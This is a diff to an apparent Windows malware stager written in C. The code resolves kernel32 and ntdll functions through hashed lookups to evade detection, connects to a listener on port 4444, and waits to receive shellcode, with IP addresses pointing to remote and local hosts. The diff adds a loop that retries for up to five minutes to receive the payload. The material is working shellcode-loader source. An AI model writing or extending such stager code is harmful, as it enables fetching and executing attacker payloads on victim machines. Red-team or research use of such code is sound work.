@@ -74,7 +74,7 @@ int run(const char* host, const char* port)
     //FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
 
     HMODULE ntdll_module = GetModuleHandleManualHashO(NTDLL_DLL_HASH);
-    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHashO(ntdll_module, LDRLOADDLL_HASH);
+    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
 
     ////////////////////////////////////
     CHAR ModuleName[12] = {0}; // Increase size
@@ -173,6 +173,7 @@ int run(const char* host, const char* port)
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
 		// printf("socket failed: %d\n", WSAGetLastError());
+		printf("socket failed\n");
         return 1;
     }
 
@@ -193,7 +194,7 @@ int run(const char* host, const char* port)
     if (pGetAddrInfo(host, port, &hints, &result) != 0) 
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
-		// printf("getaddrinfo failed\n");
+		printf("getaddrinfo failed\n");
         return 1;
     }
 
@@ -217,7 +218,7 @@ int run(const char* host, const char* port)
     if (!connected) 
 	{
         //std::cout << "connect failed" << std::endl;
-        // printf("connect failed\n");
+        printf("connect failed\n");
         return 1;
     }
 
@@ -225,14 +226,39 @@ int run(const char* host, const char* port)
     //std::cout << "4 - Connected" << std::endl;
     // printf("4 - Connected\n");
 
-	unsigned char shellcode[512];
+	//unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
-	int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
+	//int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
     
-    if (bytes_received <= 0) 
-	{
+    //if (bytes_received <= 0) 
+	//{
         //std::cout << "recv failed, received: " << bytes_received << std::endl;
         // printf("recv failed, received: %d\n", bytes_received);
+        //return 1;
+    //}
+
+    // TODO: have server send a "keep alive" message instead
+	unsigned char shellcode[512];
+    int bytes_received = 0;
+    int total_attempts = 0;
+    const int max_attempts = 600; // Wait up to 5 minutes (600 * 0.5 seconds)
+
+    // TODO: i want the connection to probably stay open even after sending one command 
+    while (bytes_received <= 0 && total_attempts < max_attempts)
+    {
+        bytes_received = pRecv(sock, (char *)shellcode, 512, 0);
+
+        if (bytes_received <= 0)
+        {
+            // No data yet, wait and retry
+            Sleep(500); // Wait 500ms between attempts
+            total_attempts++;
+        }
+    }
+
+    if (bytes_received <= 0)
+    {
+        printf("Timeout waiting for shellcode\n");
         return 1;
     }
 
@@ -292,7 +318,9 @@ int main()
     //Stager tcpStager;
     //tcpStager.run("172.18.245.234", "4444");
     //tcpStager.run("10.0.0.86", "4444");
-    run("172.18.245.234", "4444");
+    const char server_ip[] = "127.0.0.1";
+    run(server_ip, "4444");
+    //run("172.18.245.234", "4444");
     //run("10.0.0.86", "4444");
 }
 
